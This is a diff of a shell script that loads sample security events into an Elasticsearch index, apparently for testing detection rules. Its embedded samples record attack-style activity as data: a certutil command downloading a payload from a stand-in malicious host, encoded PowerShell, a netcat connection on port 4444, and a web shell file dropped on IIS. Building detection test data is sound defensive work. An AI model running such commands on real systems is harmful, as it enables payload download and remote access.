@@ -1,62 +1,54 @@
 #!/bin/sh
-# Load test data into Elasticsearch instance
+# Load test data into Elasticsearch: prefers tests/fixtures/*.ndjson when present,
+# otherwise loads small embedded samples (for CI without local fixtures).
 
 set -e
 
 ES_HOST="${ELASTIC_HOST:-elasticsearch}"
 ES_PORT="${ELASTIC_PORT:-9200}"
 ES_URL="http://${ES_HOST}:${ES_PORT}"
+FIXTURES_DIR="${FIXTURES_DIR:-/fixtures}"
+
+SCRIPT_DIR="$(CDPATH= cd -- "$(dirname "$0")" && pwd)"
 
 echo "Waiting for Elasticsearch to be ready..."
-until curl -s "${ES_URL}/_cluster/health" | grep -q '"status":"green"\|"status":"yellow"'; do
+until curl -sf "${ES_URL}/_cluster/health" | grep -q '"status":"green"\|"status":"yellow"'; do
   echo "Elasticsearch not ready yet, waiting..."
   sleep 5
 done
 echo "Elasticsearch is ready!"
 
-# Create index with mappings for security events
-echo "Creating security events index..."
-curl -s -X PUT "${ES_URL}/security-events" -H "Content-Type: application/json" -d '{
-  "settings": {
-    "number_of_shards": 1,
-    "number_of_replicas": 0
-  },
-  "mappings": {
-    "properties": {
-      "@timestamp": { "type": "date" },
-      "event.action": { "type": "keyword" },
-      "event.category": { "type": "keyword" },
-      "event.type": { "type": "keyword" },
-      "process.name": { "type": "keyword" },
-      "process.executable": { "type": "keyword" },
-      "process.command_line": { "type": "text", "fields": { "keyword": { "type": "keyword" } } },
-      "process.parent.name": { "type": "keyword" },
-      "process.parent.executable": { "type": "keyword" },
-      "file.path": { "type": "keyword" },
-      "file.name": { "type": "keyword" },
-      "user.name": { "type": "keyword" },
-      "user.domain": { "type": "keyword" },
-      "host.name": { "type": "keyword" },
-      "host.os.family": { "type": "keyword" },
-      "source.ip": { "type": "ip" },
-      "destination.ip": { "type": "ip" },
-      "destination.port": { "type": "integer" },
-      "dns.question.name": { "type": "keyword" },
-      "dns.question.type": { "type": "keyword" },
-      "network.protocol": { "type": "keyword" },
-      "cloud.provider": { "type": "keyword" },
-      "cloud.region": { "type": "keyword" },
-      "aws.cloudtrail.event_name": { "type": "keyword" },
-      "aws.cloudtrail.user_identity.type": { "type": "keyword" },
-      "aws.cloudtrail.user_identity.user_name": { "type": "keyword" }
-    }
-  }
-}'
+echo "Recreating security-events index (dynamic mapping for ECS/Beats documents)..."
+curl -sf -X DELETE "${ES_URL}/security-events?ignore_unavailable=true" >/dev/null || true
+curl -sf -X PUT "${ES_URL}/security-events" -H "Content-Type: application/json" -d '{
+  "settings": { "number_of_shards": 1, "number_of_replicas": 0 },
+  "mappings": { "dynamic": true }
+}' >/dev/null
 echo ""
 
-# Load Windows process creation events (Sysmon-like)
-echo "Loading Windows process creation test data..."
-curl -s -X POST "${ES_URL}/security-events/_bulk" -H "Content-Type: application/x-ndjson" -d '
+USE_FIXTURES=false
+if [ -d "$FIXTURES_DIR" ]; then
+  for _f in "$FIXTURES_DIR"/*.ndjson; do
+    if [ -f "$_f" ]; then
+      USE_FIXTURES=true
+      break
+    fi
+  done
+fi
+
+if [ "$USE_FIXTURES" = true ]; then
+  echo "Loading documents from ${FIXTURES_DIR}/*.ndjson ..."
+  if ! python3 "${SCRIPT_DIR}/ingest_ndjson_fixtures.py" \
+      --es-url "$ES_URL" \
+      --fixtures-dir "$FIXTURES_DIR" \
+      --index security-events; then
+    echo "Fixture ingest reported errors; check stderr above." >&2
+    exit 1
+  fi
+else
+  echo "No *.ndjson fixtures in ${FIXTURES_DIR}; loading embedded minimal samples."
+  # Embedded samples (flat ECS-style fields for simple rule tests)
+  curl -s -X POST "${ES_URL}/security-events/_bulk" -H "Content-Type: application/x-ndjson" -d '
 {"index":{}}
 {"@timestamp":"2024-01-15T10:30:00Z","event.action":"process_created","event.category":"process","host.name":"WORKSTATION01","host.os.family":"windows","process.name":"powershell.exe","process.executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","process.command_line":"powershell.exe -enc ZQBjAGgAbwAgACIASABlAGwAbABvACIA","process.parent.name":"cmd.exe","process.parent.executable":"C:\\Windows\\System32\\cmd.exe","user.name":"testuser","user.domain":"TESTDOMAIN"}
 {"index":{}}
@@ -66,11 +58,8 @@ curl -s -X POST "${ES_URL}/security-events/_bulk" -H "Content-Type: application/
 {"index":{}}
 {"@timestamp":"2024-01-15T10:33:00Z","event.action":"process_created","event.category":"process","host.name":"WORKSTATION01","host.os.family":"windows","process.name":"certutil.exe","process.executable":"C:\\Windows\\System32\\certutil.exe","process.command_line":"certutil.exe -urlcache -split -f http://malicious.com/payload.exe","process.parent.name":"cmd.exe","process.parent.executable":"C:\\Windows\\System32\\cmd.exe","user.name":"testuser","user.domain":"TESTDOMAIN"}
 '
-echo ""
-
-# Load DNS query events
-echo "Loading DNS query test data..."
-curl -s -X POST "${ES_URL}/security-events/_bulk" -H "Content-Type: application/x-ndjson" -d '
+  echo ""
+  curl -s -X POST "${ES_URL}/security-events/_bulk" -H "Content-Type: application/x-ndjson" -d '
 {"index":{}}
 {"@timestamp":"2024-01-15T11:00:00Z","event.action":"dns_query","event.category":"network","host.name":"WORKSTATION01","host.os.family":"windows","dns.question.name":"ufile.io","dns.question.type":"A","process.name":"chrome.exe","process.executable":"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe","user.name":"testuser"}
 {"index":{}}
@@ -80,11 +69,8 @@ curl -s -X POST "${ES_URL}/security-events/_bulk" -H "Content-Type: application/
 {"index":{}}
 {"@timestamp":"2024-01-15T11:03:00Z","event.action":"dns_query","event.category":"network","host.name":"WORKSTATION01","host.os.family":"windows","dns.question.name":"pastebin.com","dns.question.type":"A","process.name":"curl.exe","process.executable":"C:\\Windows\\System32\\curl.exe","user.name":"testuser"}
 '
-echo ""
-
-# Load network connection events
-echo "Loading network connection test data..."
-curl -s -X POST "${ES_URL}/security-events/_bulk" -H "Content-Type: application/x-ndjson" -d '
+  echo ""
+  curl -s -X POST "${ES_URL}/security-events/_bulk" -H "Content-Type: application/x-ndjson" -d '
 {"index":{}}
 {"@timestamp":"2024-01-15T12:00:00Z","event.action":"connection_attempted","event.category":"network","host.name":"WORKSTATION01","source.ip":"192.168.1.100","destination.ip":"203.0.113.50","destination.port":443,"network.protocol":"tcp","process.name":"chrome.exe"}
 {"index":{}}
@@ -92,11 +78,8 @@ curl -s -X POST "${ES_URL}/security-events/_bulk" -H "Content-Type: application/
 {"index":{}}
 {"@timestamp":"2024-01-15T12:02:00Z","event.action":"connection_attempted","event.category":"network","host.name":"SERVER01","source.ip":"192.168.1.10","destination.ip":"203.0.113.100","destination.port":4444,"network.protocol":"tcp","process.name":"nc.exe"}
 '
-echo ""
-
-# Load AWS CloudTrail events
-echo "Loading AWS CloudTrail test data..."
-curl -s -X POST "${ES_URL}/security-events/_bulk" -H "Content-Type: application/x-ndjson" -d '
+  echo ""
+  curl -s -X POST "${ES_URL}/security-events/_bulk" -H "Content-Type: application/x-ndjson" -d '
 {"index":{}}
 {"@timestamp":"2024-01-15T13:00:00Z","event.action":"GetObject","event.category":"cloud","cloud.provider":"aws","cloud.region":"us-east-1","aws.cloudtrail.event_name":"GetObject","aws.cloudtrail.user_identity.type":"IAMUser","aws.cloudtrail.user_identity.user_name":"testuser","source.ip":"203.0.113.1"}
 {"index":{}}
@@ -106,11 +89,8 @@ curl -s -X POST "${ES_URL}/security-events/_bulk" -H "Content-Type: application/
 {"index":{}}
 {"@timestamp":"2024-01-15T13:03:00Z","event.action":"ConsoleLogin","event.category":"cloud","cloud.provider":"aws","cloud.region":"us-east-1","aws.cloudtrail.event_name":"ConsoleLogin","aws.cloudtrail.user_identity.type":"IAMUser","aws.cloudtrail.user_identity.user_name":"suspicious-user","source.ip":"198.51.100.1"}
 '
-echo ""
-
-# Load file creation events
-echo "Loading file creation test data..."
-curl -s -X POST "${ES_URL}/security-events/_bulk" -H "Content-Type: application/x-ndjson" -d '
+  echo ""
+  curl -s -X POST "${ES_URL}/security-events/_bulk" -H "Content-Type: application/x-ndjson" -d '
 {"index":{}}
 {"@timestamp":"2024-01-15T14:00:00Z","event.action":"file_created","event.category":"file","host.name":"WORKSTATION01","host.os.family":"windows","file.path":"C:\\Users\\testuser\\Downloads\\malware.exe","file.name":"malware.exe","process.name":"chrome.exe","user.name":"testuser"}
 {"index":{}}
@@ -118,17 +98,16 @@ curl -s -X POST "${ES_URL}/security-events/_bulk" -H "Content-Type: application/
 {"index":{}}
 {"@timestamp":"2024-01-15T14:02:00Z","event.action":"file_created","event.category":"file","host.name":"SERVER01","host.os.family":"windows","file.path":"C:\\inetpub\\wwwroot\\shell.aspx","file.name":"shell.aspx","process.name":"w3wp.exe","user.name":"IIS APPPOOL\\DefaultAppPool"}
 '
-echo ""
+  echo ""
+fi
 
-# Refresh index to make data searchable
 echo "Refreshing index..."
 curl -s -X POST "${ES_URL}/security-events/_refresh"
 echo ""
 
-# Verify data loaded
 echo "Verifying data load..."
 count=$(curl -s "${ES_URL}/security-events/_count" | grep -o '"count":[0-9]*' | cut -d: -f2)
-echo "Total documents loaded: ${count}"
+echo "Total documents in security-events: ${count}"
 
 echo ""
 echo "Test data loaded successfully!"
